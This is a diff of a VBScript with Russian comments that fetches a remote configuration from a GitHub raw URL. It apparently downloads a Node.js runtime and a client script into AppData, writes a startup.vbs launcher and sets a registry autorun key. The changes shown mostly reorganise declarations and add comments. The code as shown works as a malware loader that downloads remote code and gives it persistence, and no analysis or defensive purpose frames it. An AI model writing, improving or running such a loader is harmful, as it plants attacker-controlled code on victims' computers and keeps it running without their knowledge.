@@ -1,10 +1,13 @@
 Option Explicit
 
+' === Объявление переменных ===
 Dim objShell, objFSO, objHTTP
 Dim appData, nodeDir, nodeZip, clientZip, nodeExe, clientJs
 Dim nodeZipUrl, clientZipUrl, clientJsUrl, regPath
-Dim i, success
+Dim configUrl, dict, lines, line, key, value
+Dim i, success, vbsFile, f
 
+' === Создаём объекты ===
 Set objShell = CreateObject("Wscript.Shell")
 Set objFSO   = CreateObject("Scripting.FileSystemObject")
 Set objHTTP  = CreateObject("MSXML2.XMLHTTP")
@@ -14,11 +17,11 @@ configUrl = "https://raw.githubusercontent.com/DaleGelb/files/main/ConfAl.txt"
 objHTTP.Open "GET", configUrl, False
 objHTTP.Send
 If objHTTP.Status <> 200 Then
+    WScript.Echo "Не удалось загрузить конфиг"
     WScript.Quit
 End If
 
-Dim dict : Set dict = CreateObject("Scripting.Dictionary")
-Dim lines, line, key, value
+Set dict = CreateObject("Scripting.Dictionary")
 lines = Split(objHTTP.ResponseText, vbCrLf)
 For Each line In lines
     If Trim(line) <> "" And InStr(line, "=") > 0 Then
@@ -77,7 +80,6 @@ If objFSO.FileExists(nodeExe) Then
 End If
 
 ' === Создаём автозагрузку VBS ===
-Dim vbsFile, f
 vbsFile = nodeDir & "\startup.vbs"
 Set f = objFSO.CreateTextFile(vbsFile, True)
 f.WriteLine "Set sh = CreateObject(""Wscript.Shell"")"
@@ -88,6 +90,3 @@ f.Close
 
 ' === Добавляем ключ автозапуска из конфига ===
 objShell.RegWrite regPath, "wscript.exe """ & vbsFile & """", "REG_SZ"
-
-objShell.RegWrite regPath, "wscript.exe """ & vbsFile & """", "REG_SZ"
-
